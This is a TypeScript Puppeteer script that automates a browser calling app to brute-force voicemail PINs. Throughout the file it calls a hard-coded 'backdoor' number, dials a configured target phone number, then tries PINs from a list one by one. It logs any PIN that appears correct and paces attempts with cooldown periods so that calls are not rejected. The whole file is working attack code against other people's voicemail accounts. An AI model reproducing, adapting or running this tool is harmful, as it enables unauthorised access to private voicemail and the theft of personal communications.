import { Browser, ElementHandle, Page, TimeoutError } from "puppeteer";
import {
  evaluateMicrophone,
  evaluateCallButton,
  evaluateCallConnection,
  evaluateConsole,
} from "./evaluate";
import { logResult, logPin } from "./logutil";
import { constructDialerKeypad } from "./dialer";
import { configs } from "../configs/app-configs";

async function makeCall(page: Page): Promise<void> {
  await page.waitForTimeout(3500);
  await evaluateCallButton(page);

  await page.click("#newCall", { delay: 300 });
  await page.waitForSelector("#newCallRecipients", { timeout: 10000 });
  await page.type("#newCallRecipients", "8056377243", { delay: 200 });
  await page.waitForTimeout(2000);
  await page.click("#callButton", { delay: 2000 });
  await page.waitForSelector("#show-dialer");
  await page.click("#show-dialer");
}

async function newCall(page: Page): Promise<void> {
  await page.waitForTimeout(3500);
  await evaluateCallButton(page);
  console.log("ATTEMPTING CALL TO BACKDOOR NUMBER");

  try {
    const startCall: ElementHandle<Element> | null = await page.waitForSelector(
      "#start-call.start-conversation .tooltip",
      { timeout: 10000 }
    );

    if (startCall !== null) {
      const startCallText: string | null = await startCall.evaluate(
        (el) => el.textContent
      );
      if (
        startCallText !== null &&
        startCallText.trim() === "Call (805) 637-7243"
      ) {
        await page.click("#start-call");
        await page.waitForSelector("#show-dialer");
        await page.click("#show-dialer");
      } else {
        await makeCall(page);
      }
    }
  } catch (err: unknown) {
    if (err instanceof TimeoutError) {
      await makeCall(page);
      return;
    }

    throw new Error(String(err));
  }
}

async function waitForCallConnection(page: Page): Promise<void> {
  let { connectionCount } = configs;

  if (!connectionCount) {
    throw new Error(
      "EXCEEDED MAX NO. OF CONNECTION ATTEMPTS: INCREASE COOLDOWN PERIODS"
    );
  }

  try {
    await page.waitForFunction(
      `document.querySelector(".incall-status").innerText.includes("In call")`,
      { timeout: 10000 }
    );
  } catch (err) {
    if (err instanceof TimeoutError) {
      await evaluateCallConnection(page);
      Object.assign(configs, { connectionCount: connectionCount - 1 });
      await waitForCallConnection(page);
      return;
    }

    throw new Error(
      "POSSIBLE CALL REJECTION RECEIVED: WAIT AT LEAST 15 MINUTES BEFORE RUNNING PROGRAM AGAIN"
    );
  }

  await page.waitForTimeout(3000);

  const InCallStatus: boolean = await page.evaluate(() => {
    //check call status after 3 seconds for connection and no rejection
    return (
      document.querySelector(".incall-status") as HTMLElement
    ).innerText.includes("In call");
  });

  if (!InCallStatus) {
    throw new Error("CALL REJECTED");
  }

  console.log("CALL CONNECTED");
}

async function enterNumber(page: Page): Promise<void> {
  const dialer = await constructDialerKeypad(page);

  let { targetNumber } = configs;
  let dtmfArray: string[] = [];
  await evaluateConsole(page, "dtmf", { dtmf: dtmfArray });

  await page.waitForTimeout(5000);
  await dialer["*"].click({ delay: 300 });
  await page.waitForTimeout(5000);
  console.log("ENTERING TARGET NUMBER:", targetNumber);

  for (const key of targetNumber) {
    //Loop works better than promise.all for this scenario
    await dialer[key].click({ delay: 650 });
  }

  await page.waitForTimeout(7000);
  await evaluateConsole(page, "off", {});

  if (!(dtmfArray.join("") === "*" + targetNumber)) {
    console.log("NUMBER DIALED DID NOT MATCH TARGET NUMBER: RETRYING CALL");
    await retryCall(page, 5000);
    await waitForCallConnection(page);
    await enterNumber(page);
  }
}

async function enterPin(page: Page, pin: string): Promise<void> {
  const dialer = await constructDialerKeypad(page);

  let dtmfArray: string[] = [];
  await evaluateConsole(page, "dtmf", { dtmf: dtmfArray });

  console.log("ATTEMPTING PIN:", pin);

  for (const key of pin) {
    await dialer[key].click({ delay: 500 });
  }

  await page.waitForTimeout(1000);
  await dialer["#"].click({ delay: 300 });
  await page.waitForTimeout(5000);

  await evaluateConsole(page, "off", {});

  if (!(dtmfArray.join("") === pin + "#")) {
    console.log("PIN DIALED DID NOT MATCH PIN ATTEMPT: RETRYING CALL");
    await retryCall(page, 5000);
    await waitForCallConnection(page);
    await enterNumber(page);
    await enterPin(page, pin);
  }
}

async function checkPin(page: Page, pin: string): Promise<boolean> {
  const { pinsAttempted, pinsLog } = configs;

  let stateObj = {
    condition: false,
  };

  await evaluateConsole(page, "callEnd", { state: stateObj });
  console.log("EVALUATING PIN");
  await page.keyboard.type("#####################", { delay: 650 });
  await evaluateConsole(page, "off", {});

  try {
    await page.waitForSelector('.key[data-key="#"]', { timeout: 1500 });
  } catch (err: unknown) {
    if (err instanceof TimeoutError && stateObj.condition) {
      console.log("POSSIBLE CORRECT PIN:", pin);
      await logResult(pin, pinsLog, "POSSIBLE CORRECT");
      await logPin(pin, pinsAttempted);
      return true;
    }

    throw new Error(String(err));
  }

  await page.click('.key[data-key="#"]', { delay: 300 });
  console.log("INCORRECT PIN:", pin);
  await logResult(pin, pinsLog, "INCORRECT");
  await logPin(pin, pinsAttempted);
  return false;
}

async function endCall(page: Page): Promise<void> {
  await page.waitForTimeout(1000);
  await page.click("#show-dialer");
  await page.click("#start-call > button > img", { delay: 500 });
}

async function closeDialogContainer(page: Page): Promise<void> {
  try {
    await page.waitForSelector("#tnDialogContainer", { timeout: 4000 });
  } catch (err: unknown) {
    if (err instanceof TimeoutError) {
      return;
    }

    throw new Error(String(err));
  }

  await page.click('button[class="buttons secondary skip"]', { delay: 2000 });
}

async function cooldownPeriod(page: Page, count: number): Promise<void> {
  const { cooldown, cooldownDuration } = configs;
  if (count % cooldown === 0) {
    console.log(
      `COOLDOWN PERIOD REACHED: WAITING ${Math.ceil(
        cooldownDuration / 60000
      )} MINUTES BEFORE NEXT ATTEMPT`
    );
    await page.waitForTimeout(cooldownDuration);
  }
}

export async function retryCall(page: Page, duration: number): Promise<void> {
  await endCall(page);
  await closeDialogContainer(page);
  await page.waitForTimeout(duration);
  await newCall(page);
}

export async function contextCall(page: Page): Promise<void> {
  await evaluateMicrophone(page);
  console.log("IGNORE THIS CALL ATTEMPT: SETTING CONTEXT UP");
  await makeCall(page);
  await endCall(page);
  await closeDialogContainer(page);
}

export async function attemptProcess(
  pins: string[],
  browser: Browser,
  page: Page
): Promise<void> {
  let count = 1;

  for (const pin of pins) {
    console.log(
      `----------------------- ATTEMPT: ${count} -----------------------`
    );

    await newCall(page);
    await waitForCallConnection(page);
    await enterNumber(page);
    await enterPin(page, pin);

    const result: boolean = await checkPin(page, pin);
    if (result) {
      break;
    }

    await endCall(page);
    await closeDialogContainer(page);
    await cooldownPeriod(page, count);

    count += 1;
  }

  await browser.close();
}
